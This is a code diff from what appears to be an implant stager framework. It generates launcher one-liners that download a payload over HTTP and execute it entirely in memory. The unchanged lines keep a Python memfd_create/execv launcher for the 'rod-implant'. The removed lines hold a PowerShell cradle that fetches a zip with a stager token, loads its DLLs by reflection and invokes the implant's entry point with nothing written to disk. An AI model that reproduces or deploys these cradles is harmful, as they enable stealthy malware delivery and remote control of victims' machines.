@@ -66,29 +66,7 @@ public static class ShellUpgradeLaunchers
                     + "d=urllib.request.urlopen(q).read();"
                     + "f=os.memfd_create('rod');"
                     + "os.write(f,d);"
-                    + "os.execv('/proc/self/fd/%d'%f,['Rod.Implant'])\""));
-        }
-
-        // The dll bundle loads whole into a pwsh 7+ process (.NET 8+): the
-        // cradle unpacks the zip in memory, loads the dependency assemblies,
-        // and invokes the entry assembly's entry point -- no byte on disk.
-        if (format == ArtifactFormat.Dll)
-        {
-            launchers.Add(new Launcher(
-                "windows-pwsh",
-                "windows",
-                "pwsh -nop -c \""
-                    + $"$z=(irm '{url}' -Headers @{{'X-Stager-Token'='{secret}'}});"
-                    + "$m=[IO.MemoryStream]::new([byte[]]$z);"
-                    + "$r=[IO.Compression.ZipArchive]::new($m);"
-                    + "foreach($e in $r.Entries|sort Name)"
-                    + "{if($e.Name -like '*.dll' -and $e.Name -ne 'Rod.Implant.dll')"
-                    + "{$s=[IO.MemoryStream]::new();$e.Open().CopyTo($s);"
-                    + "[Void][Reflection.Assembly]::Load($s.ToArray())}};"
-                    + "$s=[IO.MemoryStream]::new();"
-                    + "($r.Entries|where Name -eq 'Rod.Implant.dll').Open().CopyTo($s);"
-                    + "$t=[Reflection.Assembly]::Load($s.ToArray());"
-                    + "$t.EntryPoint.Invoke($null,(,[string[]]@)).Wait()\""));
+                    + "os.execv('/proc/self/fd/%d'%f,['rod-implant'])\""));
         }
 
         return launchers;
